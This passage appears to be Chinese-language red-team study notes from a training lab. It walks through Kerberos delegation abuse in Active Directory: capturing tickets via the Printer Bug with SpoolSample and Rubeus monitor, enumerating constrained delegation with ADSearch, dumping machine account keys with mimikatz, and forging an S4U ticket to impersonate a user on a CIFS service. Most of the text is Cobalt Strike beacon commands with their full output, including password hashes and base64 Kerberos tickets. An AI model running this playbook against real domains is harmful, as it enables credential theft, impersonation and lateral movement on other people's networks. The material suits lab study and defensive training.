fL4IucOzZHkvC024NNNu139K7ShexLfelaQO6n8NT2y/vtjQEFpjdvXXypo+Q5R3cb5xA+PIu5VFtU5AWe2ZQrde7TYwhDlV+e5e4wqIL7s+HFZFBrOWh+NHFLqPmwbx/8TQytnZAhcPZLp6HdhNh5plP+o9HZapOXd6x5jexQI7BxqGo0m/lU0vuAHqoKcyJHV4MGPUTuY3Byw+37yYnLaR4W6jvvzRl+jMielLE3I852D3SFXOGuAJRdf+ZhrrVrY6Eeb8bKfImsLp9CvbxGEsAvs9K5kcWIWJ3sPC880o7DZlVJP6jIkOSVIWrnKUaxB+7PvVbcGoNkVsi23MHCUPPArF3Im9jxWagODSQHmhzYiKkghHJIHZUX4KymnmnEjebClwcQvtol570LS/cvGqtEStvCQLH30kXI+bXtiBPxZUTYRnztDyMwBTUqhSELZbrvGA/SViJrOMZO24vUc7VpMwArVRDlubq1VBNuZNpSCuHXoQ9Dz0X65lCETjpyKSxGPh4cPiwY/xDljqEZnG6COOSj6iSHAR1w8eDw1ziMUYGIf0uNHsJBhHRiZYaL8FbL/0rPvVKWPSuJk69smoSMn22bLNf05aP15RbyGiC3nymUCHRXhT3b+APKxsFHl8h/DbVlEvPWFmI6hGIO7I3/4VJkXUkI+0VebmRk9BfVF/T+U1lHr9iy0DGjocsAzOhL23Y8JCV839tNmM6DFTY5jGu5lOOwl5J/fiE4yFGcp7CjgfIwge+gAwIBAKKB5wSB5H2B4TCB3qCB2zCB2DCB1aArMCmgAwIBEqEiBCDp028cyVAizDtOxteLI/smZyuj14wvAn5HtIjziiQwh6ETGxFERVYuQ1lCRVJCT1RJQy5JT6ISMBCgAwIBAaEJMAcbBW5sYW1iowcDBQBgIQAApREYDzIwMjIwODEzMDAwNTM1WqYRGA8yMDIyMDgxMzEwMDUzNVqnERgPMTk3MDAxMDEwMDAwMDBaqBMbEURFVi5DWUJFUkJPVElDLklPqSYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JTw=="))
```



4. 停止捕获

```
beacon> jobs
[*] Tasked beacon to list jobs
[+] host called home, sent: 8 bytes
[*] Jobs

 JID  PID   Description
 ---  ---   -----------
 1    4400  .NET assembly

beacon> jobkill 1
[*] Tasked beacon to kill job 1
[+] host called home, sent: 10 bytes
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660179755965.png)

5. 转存ticket

1660349494829.png

6. 使用上面生成的ticket

1660349572197.png


# The "Printer Bug"

也是无约束委派的利用

1. 在srv-1开启监听
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe monitor /targetuser:DC-2$ /interval:10 /nowrap
```
1660349812805.png

2. 在WKSTN-1强制dc-2向srv-1进行身份验证

```
execute-assembly C:\Tools\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe dc-2 srv-1
```

1660349927216.png

3. 捕获到DC2的ticket

1660349990632.png

4. 制作成dc2的ticket

1660350175707.png

5. 导入ticket

1660350337962.png

# Constrained Delegation

枚举约束委派
```
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

显示
```
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
[*] Tasked beacon to run .NET program: ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
[+] host called home, sent: 483667 bytes
[+] received output:

    ___    ____  _____                 __  
   /   |  / __ \/ ___/___  ____ ______/ /_ 
  / /| | / / / /\__ \/ _ \/ __ `/ ___/ __ \
 / ___ |/ /_/ /___/ /  __/ /_/ / /__/ / / /
/_/  |_/_____//____/\___/\__,_/\___/_/ /_/ 
                                           
Twitter: @tomcarver_
GitHub: @tomcarver16
            
[*] No domain supplied. This PC's domain will be used instead
[*] LDAP://DC=dev,DC=cyberbotic,DC=io
[*] CUSTOM SEARCH: 

[+] received output:
[*] TOTAL NUMBER OF SEARCH RESULTS: 1

[+] received output:
[
  {
    "cn": "SRV-2",
    "dnshostname": "srv-2.dev.cyberbotic.io",
    "samaccountname": "SRV-2$",
    "msds-allowedtodelegateto": [
      "eventlog/dc-2.dev.cyberbotic.io/dev.cyberbotic.io",
      "eventlog/dc-2.dev.cyberbotic.io",
      "eventlog/DC-2",
      "eventlog/dc-2.dev.cyberbotic.io/DEV",
      "eventlog/DC-2/DEV",
      "cifs/wkstn-2.dev.cyberbotic.io",
      "cifs/WKSTN-2"
    ]
  }
]

```

1660350554524.png

从枚举结果可知，srv-2委派了

wkstn-2上的cifs服务

dc-2上的eventlog服务

## 方法一
查看机器里面的tgt
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe triage
```

显示
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe triage
[*] Tasked beacon to run .NET program: Rubeus.exe triage
[+] host called home, sent: 585271 bytes
[+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.1 


Action: Triage Kerberos Tickets (All Users)

[*] Current LUID    : 0x3e7

 ---------------------------------------------------------------------------------------------------------------- 
 | LUID    | UserName                   | Service                                       | EndTime               |
 ---------------------------------------------------------------------------------------------------------------- 
 | 0x3e4   | srv-2$ @ DEV.CYBERBOTIC.IO | krbtgt/DEV.CYBERBOTIC.IO                      | 8/13/2022 9:59:32 AM  |

...

```


1660351272613.png


## 方法二

或者使用mimimkatz导出srv-2的tgt

导出哈希
```
mimikatz sekurlsa::ekeys
beacon> mimikatz sekurlsa::ekeys
[*] Tasked beacon to run mimikatz's sekurlsa::ekeys command
[+] host called home, sent: 788093 bytes
[+] received output:

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : SRV-2$
Domain            : DEV
Logon Server      : (null)
Logon Time        : 8/12/2022 11:56:25 PM
SID               : S-1-5-20

	 * Username : srv-2$
	 * Domain   : DEV.CYBERBOTIC.IO
	 * Password : (null)
	 * Key List :
	   aes256_hmac       6e2aa9430552f43c26e3d534d49776f7a53ca938dff193b877ba7502bdaf1750
	   rc4_hmac_nt       f797a8372d1e7a821e49f61efca73e23
	   rc4_hmac_old      f797a8372d1e7a821e49f61efca73e23
	   rc4_md4           f797a8372d1e7a821e49f61efca73e23
	   rc4_hmac_nt_exp   f797a8372d1e7a821e49f61efca73e23
	   rc4_hmac_old_exp  f797a8372d1e7a821e49f61efca73e23


```

利用哈希导出tgt
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:srv-2$ /aes256:6e2aa9430552f43c26e3d534d49776f7a53ca938dff193b877ba7502bdaf1750 /opsec /nowrap
```


根据base64制作tgt

```
[IO.File]::WriteAllBytes("C:\Users\Administrator\desktop\srv-2.kirbi", [Convert]::FromBase64String("doIFLDCCBSigAwIBBaEDAgEWooIEJDCCBCBhggQcMIIEGKADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCA9IwggPOoAMCARKhAwIBAqKCA8AEggO8fOhVlAS/zEnZTsYjnXPdDMy0KpsClN+FYLxvzJf0Q5BTvFsP7s4ydsq8Irv90yGukYz+LkKueGx6wOlWPoXt0ukG/uVmhMjJMI96W92nQd2QRVoN2Fquzo7L8PU5MT0HkglN2ZwjYlUK2IkYQ++lShBEBZFiYM8lmvUSd3F/thF3b2DBPSRQ0LOkuiU0XydekDDdkycYneAjWnNpOtE6QkfWR/GTwis/Sz35tEZufcSM9UuXdd4GPy0eIkUpPXb08s88HXsRmTK17n3d738VIGKRjwV97FuR7R56S5N5CQvyfjpUbzf0nX3AgO7522Jv+Wz9DV1ruXpthXGf6iXHVkHunKptD7DTFwdrWkOGNIogOkDjqHF7Ejc4Rs0ozsZealvM52nC2EHuwQhQ2YrfbZXV46TXs+Vh4S+pBAUvVYoEuIGDBucUmfyAXHTyoXmZf8MTUAvKdYDm7NwSAv7ZcWe7R1b63/i9njxOQWhSQdVTi/FbtUZybTvnHYotp87Mraswuw0kL1/8Df/BI6QDkKiVosakW7om8y7gtihxHfPHVqxnn/qmtfbsPXBjpUcGC/hJVcwctQXNSd3uZHry0FrJ2uZszixg9isXSDiKNjs21u6EVl448MF1yig0yzhwVFZztzmzFR5e3AJF6DYAe82sjfFrLaveqcSWGMvQK3sZ7GwYnC9Mzv9TmOMAfuaHuolDfGEFluYn0b0G/3mVxirYJYwwD0jgrqCpf6qtJ/IbIRBRceNR4tkc3myptC52ip4jfb+O+TlgQtgkxerEu3RX+DQbzrGSz58QfEr3eqCtqXspcztpKZWQ+Z6ot4ae/0MgKRLicuiQX74boET6pXoJaqLjURJnwfy4p5gNAvx9PfexchfaQcmzelqShuLiiPSakVcWh7NwNzaLWszEr57QO74wdBASwRyHFrNHKUY4RGn6dFuQwxacUCgd0XxFnaUDRblE4gtlrGJ459/XQOPOCJnY501oGKnm6tEpAB8Bne3IQU0nBmfmXh1lKLJ9OD5OkiKZyzqP1KAO9vG919XS/EgaDpvBGD7GINergqn8wsWjyeUg+lAJXtJDmMIAIKbJZ1q1J//i6H8KE1x5cixFC3oUip7tj9h/4Rc1NecP6CH2/y7qaqIi+EKVe0kvBA2DSCtQyBhMfdSAWHwDulpOMsZpj5SDouqosU5rYY3ffJ6v7dHEOZoep4OGI0AXGhU02cIiaDeTFCzvvlMHzGLRV7WLIR24GzciJoxRu3/k3GeylYgHZ2I+NpWjgfMwgfCgAwIBAKKB6ASB5X2B4jCB36CB3DCB2TCB1qArMCmgAwIBEqEiBCDuzf+ZtnnNVrd9s1eEG3GhG87pMy3KdLrw3aRaEyYHjqETGxFERVYuQ1lCRVJCT1RJQy5JT6ITMBGgAwIBAaEKMAgbBlNSVi0yJKMHAwUAQOEAAKURGA8yMDIyMDgxMzAwNDg1N1qmERgPMjAyMjA4MTMxMDQ4NTdapxEYDzIwMjIwODIwMDA0ODU3WqgTGxFERVYuQ1lCRVJCT1RJQy5JT6kmMCSgAwIBAqEdMBsbBmtyYnRndBsRREVWLkNZQkVSQk9USUMuSU8="))
```


根据tgt，生成访问cifs的tgs

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/wkstn-2.dev.cyberbotic.io /user:srv-2$ /ticket:doIFLDCCBSigAwIBBaEDAgEWooIEJDCCBCBhggQcMIIEGKADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCA9IwggPOoAMCARKhAwIBAqKCA8AEggO8fOhVlAS/zEnZTsYjnXPdDMy0KpsClN+FYLxvzJf0Q5BTvFsP7s4ydsq8Irv90yGukYz+LkKueGx6wOlWPoXt0ukG/uVmhMjJMI96W92nQd2QRVoN2Fquzo7L8PU5MT0HkglN2ZwjYlUK2IkYQ++lShBEBZFiYM8lmvUSd3F/thF3b2DBPSRQ0LOkuiU0XydekDDdkycYneAjWnNpOtE6QkfWR/GTwis/Sz35tEZufcSM9UuXdd4GPy0eIkUpPXb08s88HXsRmTK17n3d738VIGKRjwV97FuR7R56S5N5CQvyfjpUbzf0nX3AgO7522Jv+Wz9DV1ruXpthXGf6iXHVkHunKptD7DTFwdrWkOGNIogOkDjqHF7Ejc4Rs0ozsZealvM52nC2EHuwQhQ2YrfbZXV46TXs+Vh4S+pBAUvVYoEuIGDBucUmfyAXHTyoXmZf8MTUAvKdYDm7NwSAv7ZcWe7R1b63/i9njxOQWhSQdVTi/FbtUZybTvnHYotp87Mraswuw0kL1/8Df/BI6QDkKiVosakW7om8y7gtihxHfPHVqxnn/qmtfbsPXBjpUcGC/hJVcwctQXNSd3uZHry0FrJ2uZszixg9isXSDiKNjs21u6EVl448MF1yig0yzhwVFZztzmzFR5e3AJF6DYAe82sjfFrLaveqcSWGMvQK3sZ7GwYnC9Mzv9TmOMAfuaHuolDfGEFluYn0b0G/3mVxirYJYwwD0jgrqCpf6qtJ/IbIRBRceNR4tkc3myptC52ip4jfb+O+TlgQtgkxerEu3RX+DQbzrGSz58QfEr3eqCtqXspcztpKZWQ+Z6ot4ae/0MgKRLicuiQX74boET6pXoJaqLjURJnwfy4p5gNAvx9PfexchfaQcmzelqShuLiiPSakVcWh7NwNzaLWszEr57QO74wdBASwRyHFrNHKUY4RGn6dFuQwxacUCgd0XxFnaUDRblE4gtlrGJ459/XQOPOCJnY501oGKnm6tEpAB8Bne3IQU0nBmfmXh1lKLJ9OD5OkiKZyzqP1KAO9vG919XS/EgaDpvBGD7GINergqn8wsWjyeUg+lAJXtJDmMIAIKbJZ1q1J//i6H8KE1x5cixFC3oUip7tj9h/4Rc1NecP6CH2/y7qaqIi+EKVe0kvBA2DSCtQyBhMfdSAWHwDulpOMsZpj5SDouqosU5rYY3ffJ6v7dHEOZoep4OGI0AXGhU02cIiaDeTFCzvvlMHzGLRV7WLIR24GzciJoxRu3/k3GeylYgHZ2I+NpWjgfMwgfCgAwIBAKKB6ASB5X2B4jCB36CB3DCB2TCB1qArMCmgAwIBEqEiBCDuzf+ZtnnNVrd9s1eEG3GhG87pMy3KdLrw3aRaEyYHjqETGxFERVYuQ1lCRVJCT1RJQy5JT6ITMBGgAwIBAaEKMAgbBlNSVi0yJKMHAwUAQOEAAKURGA8yMDIyMDgxMzAwNDg1N1qmERgPMjAyMjA4MTMxMDQ4NTdapxEYDzIwMjIwODIwMDA0ODU3WqgTGxFERVYuQ1lCRVJCT1RJQy5JT6kmMCSgAwIBAqEdMBsbBmtyYnRndBsRREVWLkNZQkVSQk9USUMuSU8= /nowrap
```

结果

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/wkstn-2.dev.cyberbotic.io /user:srv-2$ /ticket:doIFLDCCBSigAwIBBaEDAgEWooIEJDCCBCBhggQcMIIEGKADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCA9IwggPOoAMCARKhAwIBAqKCA8AEggO8fOhVlAS/zEnZTsYjnXPdDMy0KpsClN+FYLxvzJf0Q5BTvFsP7s4ydsq8Irv90yGukYz+LkKueGx6wOlWPoXt0ukG/uVmhMjJMI96W92nQd2QRVoN2Fquzo7L8PU5MT0HkglN2ZwjYlUK2IkYQ++lShBEBZFiYM8lmvUSd3F/thF3b2DBPSRQ0LOkuiU0XydekDDdkycYneAjWnNpOtE6QkfWR/GTwis/Sz35tEZufcSM9UuXdd4GPy0eIkUpPXb08s88HXsRmTK17n3d738VIGKRjwV97FuR7R56S5N5CQvyfjpUbzf0nX3AgO7522Jv+Wz9DV1ruXpthXGf6iXHVkHunKptD7DTFwdrWkOGNIogOkDjqHF7Ejc4Rs0ozsZealvM52nC2EHuwQhQ2YrfbZXV46TXs+Vh4S+pBAUvVYoEuIGDBucUmfyAXHTyoXmZf8MTUAvKdYDm7NwSAv7ZcWe7R1b63/i9njxOQWhSQdVTi/FbtUZybTvnHYotp87Mraswuw0kL1/8Df/BI6QDkKiVosakW7om8y7gtihxHfPHVqxnn/qmtfbsPXBjpUcGC/hJVcwctQXNSd3uZHry0FrJ2uZszixg9isXSDiKNjs21u6EVl448MF1yig0yzhwVFZztzmzFR5e3AJF6DYAe82sjfFrLaveqcSWGMvQK3sZ7GwYnC9Mzv9TmOMAfuaHuolDfGEFluYn0b0G/3mVxirYJYwwD0jgrqCpf6qtJ/IbIRBRceNR4tkc3myptC52ip4jfb+O+TlgQtgkxerEu3RX+DQbzrGSz58QfEr3eqCtqXspcztpKZWQ+Z6ot4ae/0MgKRLicuiQX74boET6pXoJaqLjURJnwfy4p5gNAvx9PfexchfaQcmzelqShuLiiPSakVcWh7NwNzaLWszEr57QO74wdBASwRyHFrNHKUY4RGn6dFuQwxacUCgd0XxFnaUDRblE4gtlrGJ459/XQOPOCJnY501oGKnm6tEpAB8Bne3IQU0nBmfmXh1lKLJ9OD5OkiKZyzqP1KAO9vG919XS/EgaDpvBGD7GINergqn8wsWjyeUg+lAJXtJDmMIAIKbJZ1q1J//i6H8KE1x5cixFC3oUip7tj9h/4Rc1NecP6CH2/y7qaqIi+EKVe0kvBA2DSCtQyBhMfdSAWHwDulpOMsZpj5SDouqosU5rYY3ffJ6v7dHEOZoep4OGI0AXGhU02cIiaDeTFCzvvlMHzGLRV7WLIR24GzciJoxRu3/k3GeylYgHZ2I+NpWjgfMwgfCgAwIBAKKB6ASB5X2B4jCB36CB3DCB2TCB1qArMCmgAwIBEqEiBCDuzf+ZtnnNVrd9s1eEG3GhG87pMy3KdLrw3aRaEyYHjqETGxFERVYuQ1lCRVJCT1RJQy5JT6ITMBGgAwIBAaEKMAgbBlNSVi0yJKMHAwUAQOEAAKURGA8yMDIyMDgxMzAwNDg1N1qmERgPMjAyMjA4MTMxMDQ4NTdapxEYDzIwMjIwODIwMDA0ODU3WqgTGxFERVYuQ1lCRVJCT1RJQy5JT6kmMCSgAwIBAqEdMBsbBmtyYnRndBsRREVWLkNZQkVSQk9USUMuSU8= /nowrap
[*] Tasked beacon to run .NET program: Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/wkstn-2.dev.cyberbotic.io /user:srv-2$ /ticket:doIFLDCCBSigAwIBBaEDAgEWooIEJDCCBCBhggQcMIIEGKADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCA9IwggPOoAMCARKhAwIBAqKCA8AEggO8fOhVlAS/zEnZTsYjnXPdDMy0KpsClN+FYLxvzJf0Q5BTvFsP7s4ydsq8Irv90yGukYz+LkKueGx6wOlWPoXt0ukG/uVmhMjJMI96W92nQd2QRVoN2Fquzo7L8PU5MT0HkglN2ZwjYlUK2IkYQ++lShBEBZFiYM8lmvUSd3F/thF3b2DBPSRQ0LOkuiU0XydekDDdkycYneAjWnNpOtE6QkfWR/GTwis/Sz35tEZufcSM9UuXdd4GPy0eIkUpPXb08s88HXsRmTK17n3d738VIGKRjwV97FuR7R56S5N5CQvyfjpUbzf0nX3AgO7522Jv+Wz9DV1ruXpthXGf6iXHVkHunKptD7DTFwdrWkOGNIogOkDjqHF7Ejc4Rs0ozsZealvM52nC2EHuwQhQ2YrfbZXV46TXs+Vh4S+pBAUvVYoEuIGDBucUmfyAXHTyoXmZf8MTUAvKdYDm7NwSAv7ZcWe7R1b63/i9njxOQWhSQdVTi/FbtUZybTvnHYotp87Mraswuw0kL1/8Df/BI6QDkKiVosakW7om8y7gtihxHfPHVqxnn/qmtfbsPXBjpUcGC/hJVcwctQXNSd3uZHry0FrJ2uZszixg9isXSDiKNjs21u6EVl448MF1yig0yzhwVFZztzmzFR5e3AJF6DYAe82sjfFrLaveqcSWGMvQK3sZ7GwYnC9Mzv9TmOMAfuaHuolDfGEFluYn0b0G/3mVxirYJYwwD0jgrqCpf6qtJ/IbIRBRceNR4tkc3myptC52ip4jfb+O+TlgQtgkxerEu3RX+DQbzrGSz58QfEr3eqCtqXspcztpKZWQ+Z6ot4ae/0MgKRLicuiQX74boET6pXoJaqLjURJnwfy4p5gNAvx9PfexchfaQcmzelqShuLiiPSakVcWh7NwNzaLWszEr57QO74wdBASwRyHFrNHKUY4RGn6dFuQwxacUCgd0XxFnaUDRblE4gtlrGJ459/XQOPOCJnY501oGKnm6tEpAB8Bne3IQU0nBmfmXh1lKLJ9OD5OkiKZyzqP1KAO9vG919XS/EgaDpvBGD7GINergqn8wsWjyeUg+lAJXtJDmMIAIKbJZ1q1J//i6H8KE1x5cixFC3oUip7tj9h/4Rc1NecP6CH2/y7qaqIi+EKVe0kvBA2DSCtQyBhMfdSAWHwDulpOMsZpj5SDouqosU5rYY3ffJ6v7dHEOZoep4OGI0AXGhU02cIiaDeTFCzvvlMHzGLRV7WLIR24GzciJoxRu3/k3GeylYgHZ2I+NpWjgfMwgfCgAwIBAKKB6ASB5X2B4jCB36CB3DCB2TCB1qArMCmgAwIBEqEiBCDuzf+ZtnnNVrd9s1eEG3GhG87pMy3KdLrw3aRaEyYHjqETGxFERVYuQ1lCRVJCT1RJQy5JT6ITMBGgAwIBAaEKMAgbBlNSVi0yJKMHAwUAQOEAAKURGA8yMDIyMDgxMzAwNDg1N1qmERgPMjAyMjA4MTMxMDQ4NTdapxEYDzIwMjIwODIwMDA0ODU3WqgTGxFERVYuQ1lCRVJCT1RJQy5JT6kmMCSgAwIBAqEdMBsbBmtyYnRndBsRREVWLkNZQkVSQk9USUMuSU8= /nowrap
[+] host called home, sent: 588995 bytes
[+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.1 

[*] Action: S4U


[+] received output:
[*] Action: S4U

[*] Building S4U2self request for: 'SRV-2$@DEV.CYBERBOTIC.IO'
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
[*] Sending S4U2self request to 10.10.17.71:88

[+] received output:
[+] S4U2self success!
[*] Got a TGS for 'nlamb' to 'SRV-2$@DEV.CYBERBOTIC.IO'
[*] base64(ticket.kirbi):

      doIFfjCCBXqgAwIBBaEDAgEWooIEnTCCBJlhggSVMIIEkaADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPohMwEaADAgEBoQowCBsGU1JWLTIko4IEXjCCBFqgAwIBEqEDAgEFooIETASCBEgHGCOnWInEArG+7YvJ26rS6FGunQguMmhwBApldKvGNRh26/lRd9qc4CsSKau885i7cnVokLLt+lGLYDprkw/Jsyl1iMHdc+pgnSmYt7XV8dmg0zuNgeCGePDsC5UIqZAuUcdn3ihDRXj0wFxs0HpZjQ1P8MosTBfKkNwEjjBEGZ6lYBn6QL/jxJ18TykwDdNBfI+cwB3sTSyQLmyrximqnXKOo9YhiWkG2z91v9phfQEybJhgu1YyrvHLKKcy92nYzrMVPzG8yThoYo+BkslwYVZQZL2wtfeWJTPcdXlSdyRod3280B9dYzkPEJtzcIAAT52qB2ULaMlf4/jsZLiSujdM5xbCQT3jhbWBqHIvfryUWt/x64k8hzZUagMi61drn7XOD5no0F94tarpTMte5+aoVieWVMSU9wo+mbBx0slEnDN3783tlvO/Gt6ruyymdSqZaXiMkofmHuzhzGbLCCcWw0S95uRSmV7NIG0erPdiQhx0ZJQLnYN9w/gPFrYM0qLKPzFj2bR5yLJ5BrEfAmn3t0wCcs4q0FB3PpGUDZt+YxnO1+s/eK6y5+Quaz7YmT0ECLaI1tAtjFtVdNAk0knGBX/wrvV2dOEFVc+KtXhLDu/yBCM60+90C///3+ZSjKmIwYqAGvJwpwkkBo5suL8z08StMVJ1gC7YvTOdFy2rQe83lzb4uvw6UuvG3TdKFdPdT3a2yLcYoj1OtQqXxrqEmQBIhsvDFXhuDQGSIo2dG0TVCnHJA2ns2iBbayfAB1tKc06wE9+Xu/MD1i61QemJIoMvFwNWVDESrUSSKWXSZgN4Gc7js/xlqFKOLpxrzusncscU+wAjvq5UVF07dgRjedUUiit31J3BbU/ylhSZkGZUzTC+j759dXEUdK9AseYzjYB29UCfkVL975QzHuMcLLF0x7tdpLMVxt0+XI6Zt7Dav4Njp63//fkicWv5T81DQsksRr7UG1fUaBi2HQ9aIG8z75v7bys0+6wnIR2//I8i1QtITEOglidKU8yQFmPf6FZHMH/gGYVG5moS5mRQ79+KjXKtBm0JfiRFSfdB7PEFP+LDvA3mT4LpeqcICj5mhAb4ihioh++p1oetWtwui3ecTijX9eL/6v7AFmaCBXa8bmqrEabOOo0idx2mXJKg7qVHnlHIk6A/M+wkXiVuN6h5g42CIzoIpyycXMHJWa/PYeacunis1F0d0n1E5pWwNcblijrxWqAc/3Frh5f765/7DKBF4/kAA64d72aTcqnXtGr7w7Wwpx/ScKztiGWHTRuiMx51jxkbYsyEIHuN+QqTQZ+T8qv1x+kTchylyDpDrmHMFuIoC418w1opRa247QBCFrhgCDkjOLbp0vuLfkNnuPCCqmFzOQ/bt/bsP6vEWzFLUhWvJ0O1+Fcquu2BwkmWt6/SfQWGIrCFw9VC1JASC0ppQdS9zObDJrP67TDx7dkwo4HMMIHJoAMCAQCigcEEgb59gbswgbiggbUwgbIwga+gKzApoAMCARKhIgQgKndu2STtLSCZWSIzBez2fvFBHUB00VQy/4zIBLHzmY2hExsRREVWLkNZQkVSQk9USUMuSU+iEjAQoAMCAQqhCTAHGwVubGFtYqMHAwUAQCEAAKURGA8yMDIyMDgxMzAwNTMxNFqmERgPMjAyMjA4MTMxMDQ4NTdaqBMbEURFVi5DWUJFUkJPVElDLklPqRMwEaADAgEBoQowCBsGU1JWLTIk

[*] Impersonating user 'nlamb' to target SPN 'cifs/wkstn-2.dev.cyberbotic.io'
[*] Building S4U2proxy request for service: 'cifs/wkstn-2.dev.cyberbotic.io'
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
[*] Sending S4U2proxy request to domain controller 10.10.17.71:88

[+] received output:
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/wkstn-2.dev.cyberbotic.io':

      doIGWDCCBlSgAwIBBaEDAgEWooIFbjCCBWphggVmMIIFYqADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiwwKqADAgECoSMwIRsEY2lmcxsZd2tzdG4tMi5kZXYuY3liZXJib3RpYy5pb6OCBRYwggUSoAMCARKhAwIBBaKCBQQEggUAwDfZJtVIs9CfNrYsbKJ3JhwrdiJhZcNDRonfF2wAfmEDLyMRt+vtzdimBvmnwB68XuDDN0hH5frtH53/TRpbdnuy7YjXXX7miAQ8cuB0nFeWIE03HoOTGb1Fgbskdk2CCTEFMIOmnNEWm/2SvOHHsMGngjApzJBpnacrnWF9oAm/pSzpH9046R69q4vlGMvqG5/sa0lyYhqxA9MKbmFkMuxNN3Q866xiiNhjKfBMqp6rPUTmYvY491Z5QMNR3OgM/ljK56J4BlsahxbSSPkmAS5pCNawUuo4Kw7+K//90cBLpM8ACFXXIWQTwSUoQETRBId7pw5t1bbOPv9ns6hnWOj0vIqo8HIjPSVpnWxLt7TDdzp7tW4bkLwPaylTyHu6C6lg7WQywvea/uN4lIilvV6GKCt//X7NUcjJ7Dsxg4mvllOKcCwflCAvoJ5DZen1zwzTbqP+0eNFYKIc8V4ddJpa1xPyP63tV3Cyg4cGZ/6mm8+yOgTUDK2VM6zjG4iLOmOvtv/4MoI5D+pr59tAnS8b3KQsD1SnS0/B4uG9AD2FlrnV63UIGb8n8NX6CD4wlkEyJ/ph8hhxiXO5BGcb5DCAX2zYz/unIZlmPTCWWeQBGurN5GbDtczzOx8THZZIqKNcYtxa1SV+E6o1GIFMzJ4wb5Ox63ksXHOAbWLZttShrjn9LaztnFI7zcqeawVbQ9yj3NxpwKK7rur108JFllbBWdRsCU1VbkG/vCVJ5dpnhpLjdbsBKSb6cK3PevDj0agjCZtU7iKo7JKo4gSe25Fu45HtvGjMkuxvd4zlcoWFjACrl8uXuH5qdLSgZmhqQT6Kdueai7svPB+HvTG4oXKc7QKX6fatJIi+CUnVyp21GYSLPNtUMz3mTM/2oZjUYh3JOr8U3WH7EzvrdvgVcoFB7CcjudVS14jilrpyH03ZhNpQrzD2SyG1op0nARXjjDh1sDCh1EuKYVt8409ew0mgWqea8kO8IMuggUXtXtHJAUCCqSgZ8lbBlMckGDQtYfOa2fBUsWpzQXFlkEvnlrd5qRvAALOABs673NAoy0TY9eI6WzcM8SgVX77CH5CfTeWcOsW4JA4p//vw1P1wSnjyFj2Y76bPo6JPKfwTdMhAZHWL7gwCqoM2Ba0Dnc8CJpGxxncZXh3MMM4CgWHs8f6IJW9WeNZGEzgX9QDWAOP8Xni3MhSBg+fZZrGGpdBakY+yeIDyjJR3IWHoTTg4jWUqLKffBn4LGgM6AUi+ms2Z7iyAvA3DCWa2Xkxs175JtJDaXGErgPvggZ1nBZqyocsTvXKsybQd3wh0dcu6y6hEr6UiYGXwHt1T9Kw65i0hcIVuzYG+o5RGWI32ZZtAH7o+C3jS6ONd584TVN+vz3ZE8r9aeccix0mqUwQ6dvS0hVm6tcKSJzx72uuEOOPFaWzHjf8sDDhcGRif7I1Z/gy1eWPLWBAYpLd4h33M2Zqkit9eyl+p88hqCw//X7RP6SPEMwyhtvdMZxdfyYaUKr6jySXrKdCKJKuHII/XP0k16x957cl0lbqYfc2+nqCeOU12ZzIJ/vfUg1TF1YSbERU69EyjzlmkGXoH1R0UmpjJzROraflo1bjK+5+4Qn/Dv3AfCNDsneztJN+K/rG5ag0EUJfcJ/SJcz+rVow64y9+YricmrK3iSxw9eGxA37zpI3KN7+LEBQlgJWkWHlw88ujgdUwgdKgAwIBAKKBygSBx32BxDCBwaCBvjCBuzCBuKAbMBmgAwIBEaESBBCcyf4LBFVsBUiHd4Vw0qeQoRMbEURFVi5DWUJFUkJPVElDLklPohIwEKADAgEKoQkwBxsFbmxhbWKjBwMFAEAhAAClERgPMjAyMjA4MTMwMDUzMTRaphEYDzIwMjIwODEzMTA0ODU3WqgTGxFERVYuQ1lCRVJCT1RJQy5JT6ksMCq